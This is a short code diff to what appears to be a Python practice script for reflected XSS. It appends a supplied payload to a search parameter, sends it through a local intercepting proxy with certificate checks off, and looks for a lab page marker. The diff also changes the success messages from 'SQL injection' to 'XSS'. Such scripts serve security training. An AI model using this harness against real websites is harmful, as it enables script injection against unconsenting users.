@@ -6,7 +6,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http' :'http://127.0.0.1:8080','https' :'http://127.0.0.1:8080'}
 
 def exploit_xss(url, payload):
-    uri = '/?search=hola'
+    uri = '/?search='
     r = requests.get(url + uri + payload, verify=False, proxies=proxies)
     print(r.text)
     if "Lightbulb Moments" in r.text:
@@ -26,6 +26,6 @@ if __name__ == '__main__':
         sys.exit(-1)
 
     if exploit_xss(url, payload):
-        print("[ + ] SQL injection successful")
+        print("[ + ] XSS successful")
     else:
-       print("[ - ] SQL injection unsuccessful") 
+       print("[ - ] XSS unsuccessful") 
